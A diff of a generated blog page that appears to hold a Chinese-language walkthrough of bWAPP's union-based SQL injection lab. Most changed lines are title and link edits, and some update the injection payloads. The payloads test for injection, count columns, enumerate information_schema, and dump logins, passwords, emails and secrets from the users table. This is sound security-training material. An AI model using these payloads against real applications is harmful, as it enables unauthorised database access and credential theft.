@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="bWAPP – SQL Injection (Union 注入)注入基本流程 判断存在注入 11&#39; or 1&#x3D;1#    判断字段数量 123451&#39;  order by 8#&#96;#（报错）1&#39;  order by 7##（正常回显，存在7个字段）      判断可注入字段位置 11&#39;  union select 1,2,3,4,5,6,7 #  （">
+    <meta name="description" content="bWAPP – SQL Injection (字符型Union 注入)注入基本流程 判断存在注入 11&#39; or 1&#x3D;1#    判断字段数量 123451&#39;  order by 8#&#96;#（报错）1&#39;  order by 7##（正常回显，存在7个字段）      判断可注入字段位置 11&#39;  union select 1,2,3,4,5,6,7 #">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bWAPP -- SQL Injection">
-<meta property="og:url" content="http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/index.html">
+<meta property="og:title" content="bWAPP--SQL Injection">
+<meta property="og:url" content="http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/index.html">
 <meta property="og:site_name" content="Tansz">
-<meta property="og:description" content="bWAPP – SQL Injection (Union 注入)注入基本流程 判断存在注入 11&#39; or 1&#x3D;1#    判断字段数量 123451&#39;  order by 8#&#96;#（报错）1&#39;  order by 7##（正常回显，存在7个字段）      判断可注入字段位置 11&#39;  union select 1,2,3,4,5,6,7 #  （">
+<meta property="og:description" content="bWAPP – SQL Injection (字符型Union 注入)注入基本流程 判断存在注入 11&#39; or 1&#x3D;1#    判断字段数量 123451&#39;  order by 8#&#96;#（报错）1&#39;  order by 7##（正常回显，存在7个字段）      判断可注入字段位置 11&#39;  union select 1,2,3,4,5,6,7 #">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200919211829826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200919211909721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center">
@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200919212110232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200919212130995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center">
 <meta property="article:published_time" content="2020-09-19T13:22:21.014Z">
-<meta property="article:modified_time" content="2020-09-19T13:22:25.461Z">
+<meta property="article:modified_time" content="2020-09-19T15:26:34.144Z">
 <meta property="article:author" content="Tansz">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200919211829826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center">
@@ -45,7 +45,7 @@
         
     
     <!-- title -->
-    <title>bWAPP -- SQL Injection</title>
+    <title>bWAPP--SQL Injection</title>
     <!-- styles -->
     
 <link rel="stylesheet" href="/css/style.css">
@@ -85,6 +85,8 @@
     <span id="actions">
       <ul>
         
+        <li><a class="icon" href="/2020/09/19/bWAPP-SQLInjection2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
         
         <li><a class="icon" href="/2020/09/18/bWAPP--SSI%20%20Injection/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
@@ -99,22 +101,22 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&text=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&is_video=false&description=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=bWAPP -- SQL Injection&body=Check out this article: http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&name=bWAPP -- SQL Injection&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&t=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&text=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&is_video=false&description=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bWAPP--SQL Injection&body=Check out this article: http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&name=bWAPP--SQL Injection&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&t=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bWAPP-–-SQL-Injection-Union-注入"><span class="toc-number">1.</span> <span class="toc-text">bWAPP – SQL Injection (Union 注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入基本流程"><span class="toc-number">1.1.</span> <span class="toc-text">注入基本流程</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bWAPP-–-SQL-Injection-字符型Union-注入"><span class="toc-number">1.</span> <span class="toc-text">bWAPP – SQL Injection (字符型Union 注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入基本流程"><span class="toc-number">1.1.</span> <span class="toc-text">注入基本流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#演练"><span class="toc-number">1.2.</span> <span class="toc-text">演练</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -126,7 +128,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        bWAPP -- SQL Injection
+        bWAPP--SQL Injection
     </h1>
 
 
@@ -153,7 +155,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="bWAPP-–-SQL-Injection-Union-注入"><a href="#bWAPP-–-SQL-Injection-Union-注入" class="headerlink" title="bWAPP – SQL Injection (Union 注入)"></a>bWAPP – SQL Injection (Union 注入)</h1><h2 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h2><ol>
+    <h1 id="bWAPP-–-SQL-Injection-字符型Union-注入"><a href="#bWAPP-–-SQL-Injection-字符型Union-注入" class="headerlink" title="bWAPP – SQL Injection (字符型Union 注入)"></a>bWAPP – SQL Injection (字符型Union 注入)</h1><h2 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h2><ol>
 <li><p>判断存在注入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
 
@@ -179,14 +181,14 @@
 <p><a href="https://dev.mysql.com/doc/refman/5.6/en/sql-function-reference.html" target="_blank" rel="noopener">mysql内置函数</a></p>
 </li>
 <li><p>查看表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),user(),table_name,6,7 from information_schema.tables#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),user(),table_name,6,7 from information_schema.tables table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20200919212051755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 </li>
 </ol>
 <ol start="6">
 <li><p>获取表字段名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),table_name,column_name,6,7 from information_schema.columns where table_name&#x3D;&quot;users&quot;#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),table_name,column_name,6,7 from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20200919212110232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 </li>
@@ -195,7 +197,7 @@
 <p><img src="https://img-blog.csdnimg.cn/20200919212130995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 </li>
 </ol>
-<ul>
+<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><ul>
 <li><p>low</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;  union select 1,login,Password,email,secret,6,7 from users#</span><br></pre></td></tr></table></figure>
 
@@ -242,22 +244,22 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bWAPP-–-SQL-Injection-Union-注入"><span class="toc-number">1.</span> <span class="toc-text">bWAPP – SQL Injection (Union 注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入基本流程"><span class="toc-number">1.1.</span> <span class="toc-text">注入基本流程</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bWAPP-–-SQL-Injection-字符型Union-注入"><span class="toc-number">1.</span> <span class="toc-text">bWAPP – SQL Injection (字符型Union 注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入基本流程"><span class="toc-number">1.1.</span> <span class="toc-text">注入基本流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#演练"><span class="toc-number">1.2.</span> <span class="toc-text">演练</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&text=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&is_video=false&description=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=bWAPP -- SQL Injection&body=Check out this article: http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&title=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&name=bWAPP -- SQL Injection&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/19/bWAPP%20--%20SQL%20Injection/&t=bWAPP -- SQL Injection" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&text=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&is_video=false&description=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bWAPP--SQL Injection&body=Check out this article: http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&title=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&name=bWAPP--SQL Injection&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/19/bWAPP--SQL%20Injection/&t=bWAPP--SQL Injection" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
